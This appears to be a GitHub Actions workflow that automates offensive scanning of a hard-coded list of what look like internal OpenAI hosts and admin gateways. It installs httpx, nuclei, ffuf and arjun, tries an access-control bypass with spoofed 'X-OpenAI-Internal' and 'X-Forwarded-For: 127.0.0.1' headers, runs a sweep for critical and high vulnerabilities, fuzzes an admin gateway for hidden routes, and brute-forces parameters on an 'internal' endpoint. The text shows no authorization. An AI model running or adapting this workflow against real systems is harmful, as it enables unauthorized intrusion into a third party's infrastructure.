name: OpenAI-poori-tayoli
on:
  workflow_dispatch:

jobs:
  hyper-hunt:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Advanced Arsenal
        run: |
          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
          go install -v github.com/ffuf/ffuf/v2@latest
          pip install arjun
          sudo mv ~/go/bin/* /usr/local/bin/
          # Download professional bug bounty wordlists
          mkdir -p wordlists
          curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt -o wordlists/common.txt
          curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/api/api-endpoints-res.txt -o wordlists/api.txt

      - name: Phase 1:Rapid Bypass Testing
        run: |
          cat <<EOF > master_targets.txt
          https://api.openai.com/v1/completionsinternal
          https://admin.unified-8.api.openai.com
          https://higherlevelapi.unified-8.api.openai.com
          https://chat.gateway.unified-79.api.openai.com
          https://memos.auth.ingress.sodium.sci.openai.org
          https://large-langdemo-external-access.auth.ingress.sodium.sci.openai.org
          https://openai-all.auth.ingress.sodium.sci.openai.org
          https://wiki-browser-contractors.auth.ingress.sodium.sci.openai.org
          https://infra-monitoring.auth.ingress.sulfur.sci.openai.org
          https://auth.openai.com
          https://academy.openai.com
          EOF

          httpx -l master_targets.txt -threads 100 \
            -H "X-OpenAI-Internal: true" \
            -H "X-Forwarded-For: 127.0.0.1" \
            -sc -cl -title -o bypass_results.txt

      - name: Phase 2:Critical Vulnerability Sweep
        run: |
          # Fast scan for SSRF and BOLA
          nuclei -l master_targets.txt -severity critical,high -rl 50 -o nuclei_results.txt

      - name: Phase 3:Hidden API Route Fuzzing (FIXED)
        run: |
          # Fuzzing the internal admin gateways using professional wordlists
          # We use -maxtime to ensure it doesn't hang but finds the core bugs
          ffuf -w wordlists/common.txt -u "https://admin.unified-8.api.openai.com/FUZZ" \
            -H "X-OpenAI-Internal: true" -mc 200,401,500 -maxtime 300 -o api_fuzz_results.json

      - name: Phase 4:Parameter Discovery
        run: |
          # Finding hidden parameters on the completionsinternal endpoint
          arjun -u "https://api.openai.com/v1/completionsinternal" -m POST -t 20 -oJ arjun_params.json

      - name: Archive Results
        uses: actions/upload-artifact@v4
        with:
          name: final-bug-evidence
          path: |
            bypass_results.txt
            nuclei_results.txt
            api_fuzz_results.json
            arjun_params.json
            
